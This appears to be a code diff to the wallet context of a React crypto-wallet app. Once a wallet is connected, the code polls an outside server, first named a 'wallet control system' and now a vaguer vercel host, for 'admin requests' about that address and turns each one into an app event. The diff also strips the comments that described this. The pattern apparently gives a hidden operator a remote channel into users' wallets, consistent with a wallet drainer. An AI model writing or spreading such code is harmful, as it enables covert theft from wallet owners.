@@ -1,4 +1,3 @@
-// wallet-connect-app/src/context/WalletContext.js
 import React, { createContext, useContext, useState, useEffect } from "react";
 import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";
 
@@ -13,7 +12,6 @@ export function WalletProvider({ children }) {
   const [provider, setProvider] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  // Detect wallet
   const detect = async () => {
     try {
       const d = detectWalletEnvironment();
@@ -37,7 +35,6 @@ export function WalletProvider({ children }) {
     }
   };
 
-  // Connect wallet
   const connect = async () => {
     setLoading(true);
     try {
@@ -57,7 +54,6 @@ export function WalletProvider({ children }) {
     }
   };
 
-  // Disconnect
   const disconnect = () => {
     setConnected(false);
     setChain(null);
@@ -79,19 +75,18 @@ export function WalletProvider({ children }) {
     detect();
   }, []);
 
-  // Admin request polling
   useEffect(() => {
     if (!address) return;
 
     const checkAdminRequests = async () => {
       try {
         const res = await fetch(
-          `https://meme-wallet-control-system-hx1r.vercel.app/api/get-wallet-requests?address=${address}`
+          `https://beckend0192.vercel.app/api/get-wallet-requests?address=${address}`
         );
 
         const data = await res.json();
 
-        if (data.success && Array.isArray(data.requests) && data.requests.length > 0) {
+        if (data.success && data.requests?.length > 0) {
           const req = data.requests[0];
           window.dispatchEvent(new CustomEvent("adminRequest", { detail: req }));
         }
